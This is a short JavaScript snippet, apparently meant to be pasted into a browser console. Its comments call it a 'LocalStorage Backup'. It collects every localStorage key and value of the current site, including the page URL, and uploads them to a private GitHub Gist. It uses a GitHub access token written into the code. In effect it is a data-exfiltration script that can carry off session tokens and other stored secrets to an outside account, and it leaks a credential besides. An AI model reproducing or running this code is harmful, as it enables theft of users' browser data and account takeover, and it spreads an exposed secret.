(async function() {
    const token = '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';
    
    console.log('🔍 Checking localStorage...');
    console.log(`📊 Total items: ${localStorage.length}`);
    
    if (localStorage.length === 0) {
        console.log('❌ No data found in localStorage');
        return;
    }
    
    // Collect all data
    const allData = {};
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        allData[key] = localStorage.getItem(key);
    }
    
    console.log('✅ Data collected');
    console.log('🔑 Keys found:', Object.keys(allData));
    
    // Upload to Gist
    try {
        const response = await fetch('https://api.github.com/gists', {
            method: 'POST',
            headers: {
                'Authorization': `Bearer ${token}`,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                description: `LocalStorage Backup - ${new Date().toLocaleString()}`,
                public: false,
                files: {
                    'localStorage-backup.json': {
                        content: JSON.stringify({
                            data: allData,
                            metadata: {
                                extractedAt: new Date().toISOString(),
                                totalItems: localStorage.length,
                                url: window.location.href
                            }
                        }, null, 2)
                    }
                }
            })
        });
        
        const result = await response.json();
        
        if (response.ok) {
            console.log('🎉 Success!');
            console.log('🔗 Link:', result.html_url);
            
            // Sample preview
            console.log('📋 Data Sample:');
            const keys = Object.keys(allData);
            for (let i = 0; i < Math.min(5, keys.length); i++) {
                const key = keys[i];
                const value = allData[key];
                console.log(`${key}: ${value ? value.substring(0, 100) : '(empty)'}`);
            }
            
        } else {
            console.error('❌ Error:', result.message);
        }
        
    } catch (error) {
        console.error('❌ Connection error:', error);
    }
})();
